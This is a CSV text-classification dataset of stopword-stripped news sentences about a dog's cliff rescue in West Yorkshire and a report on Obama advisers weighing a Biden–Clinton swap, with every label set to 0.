Sentence,Label
 She right middle cliff face - 50ft top bottom ,0
 She move muscle rescue - frozen solid ,0
 But fine ,0
 She eating biscuits afterwards ,0
 This unusual call-out ,0
 The fact dog spotted unbelievable ,0
 Specialist Technical Rescue Officer Peter Lau said: &quot; Ruby lucky escape ,0
 &quot; The potential could seriously injured worse ,0
 Ruby taken vets check-up found fine exhaustion dehydration ,0
" Miss Hall , Halifax , West Yorkshire , said: &quot; Watching rescue terrifying ",0
 &quot; I could believe first place ,0
 It amazing get back arms ,0
 The vet said became exhausted collapsed would probably fallen ,0
 The firefighters amazing ,0
 It really daring ,0
 We grateful every single one absolutely tremendous ,0
" Mr Alderson , Keighley , added: &quot; We scared might fall stayed ",0
 &quot; The firefighters brilliant ,0
 I &apos;t believe ,0
" Report: Obama campaign considered dumping Biden Hillary Clinton President Barack Obama &apos;s closest advisers secretly considered replacing Vice President Joe Biden Hillary Clinton 2012 ticket , according New York Times ",0
" The revelation notable bombshell Mark Halperin John Heilemann &apos;s heavily anticipated 2012 campaign tome , &quot; Double Down: Game Change 2012 ",0
 &quot; The Times obtained copy forthcoming book reported Thursday evening President &apos;s top aides conducted &quot; extensive group-sessions polling late 2011 &quot; gauge whether dumping Biden could help bolster Obama &apos;s waning re-election hopes ,0
" According Times &apos; national political correspondent Jonathan Martin , book provides thorough account effort senior officials inside campaign White House , namely former White House Chief Staff Bill Daley , measure effect swapping former Secretary State Clinton Vice President would polls ",0
 The potential switch closely guarded secret within Chicago campaign infrastructure inside Oval Office ,0
" Only half dozen President &apos;s closest advisers -- including Daley , former Obama campaign chief Jim Messina , former White House senior advisers David Axelrod David Plouffe -- knew change consideration ",0
" &quot; Double Down &quot; claims Daley spearheaded effort replace Biden , despite &quot; close personal rapport , &quot; ultimately deciding move data showed adding Clinton ticket &apos;t &quot; materially improve Obama &apos;s odds ",0
" &quot; In interview Martin , Daley confirmed administration fact consider replacing Biden Clinton ",0
" &quot; I vocal looking whole bunch things , one , &quot; Daley told paper ",0
" You remember , point President awful shape , like , &quot; Holy Christ , ? &quot; While Daley characterized research &quot; due diligence , &quot; Martin told CNN &apos;s Anderson Cooper re-election campaign made significant investment finding whether move would pay dividends polls ",0
" &quot; Campaigns &apos;t spend kind money polling focus groups unless &apos;re seriously considering something , &quot; Martin said AC360 ",0
" It &apos;s unclear , however , whether Obama knew team exploring swap ",0
